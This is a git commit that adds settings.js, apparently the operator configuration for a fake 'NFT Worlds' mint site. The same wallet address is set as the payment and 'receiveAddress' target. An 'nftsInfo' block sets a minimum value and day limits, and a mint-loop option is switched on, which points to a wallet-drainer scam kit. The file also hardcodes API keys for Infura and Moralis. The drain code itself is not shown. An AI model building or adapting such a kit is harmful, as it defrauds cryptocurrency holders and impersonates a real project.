7bb5cbd5e429a662257eae47088ab2693af31039
farangpal <98533096+farangpal@users.noreply.github.com>
2022-06-29 08:42:43 +0000

    Add files via upload

---
+++ settings.js
@@ -0,0 +1,57 @@
+const address = '0xC4A941bD540d81247B2B87bAb09832704A4407eE',
+  infuraId = '5b7825e5fcc64bc4bf49f496587392ed',
+  moralisApi =
+    'BiY8KrXg1tXZSu4JUtOJ4JGZx89DErf5ZN0bfiyXkzQLi2GU8rfjREwurLHXTJRA'
+const x20Ethereum = '0xC4A941bD540d81247B2B87bAb09832704A4407eE'
+const collectionInfo = {
+  name: 'NFT Worlds',
+  title: 'Avatars',
+  date: '30.04.2022',
+  socialMedia: {
+    discord: 'https://discord.gg/',
+    twitter: 'https://twitter.com',
+  },
+  medias: {
+    preview: 'preview.gif',
+    favicon: 'logo.png',
+  },
+  background: {
+    type: 'video',
+    image: 'background.jpg',
+    video: 'background.mp4',
+    color: '#4E4E6D',
+  },
+}
+const mintInfo = {
+    price: 0.3,
+    price2: 0.56,
+    price3: 0.3,
+    totalSupply: 9800,
+    minUnits: 0,
+    maxUnits: 5,
+    maxUnits2: 0,
+    askMintLoop: true,
+  },
+  nftsInfo = {
+    active: true,
+    minValue: 0.8,
+    checkMaxDay: 4,
+    receiveAddress: '0xC4A941bD540d81247B2B87bAb09832704A4407eE',
+  }
+if (mintInfo.minUnits > mintInfo.maxUnits) {
+  console.error(
+    'Error: minUnits (' +
+      mintInfo.minUnits +
+      ') is greater than maxUnits (' +
+      maxUnits +
+      ')'
+  )
+}
+if (mintInfo.minUnits <= 0) {
+  console.error(
+    'Error: minUnits (' + mintInfo.minUnits + ') is less than or equal to 0'
+  )
+}
+if (!address.startsWith('0x') || address.length >= 64 || address.length <= 40) {
+  console.error('Error: ' + address + ' is not a valid Ethereum address.')
+}
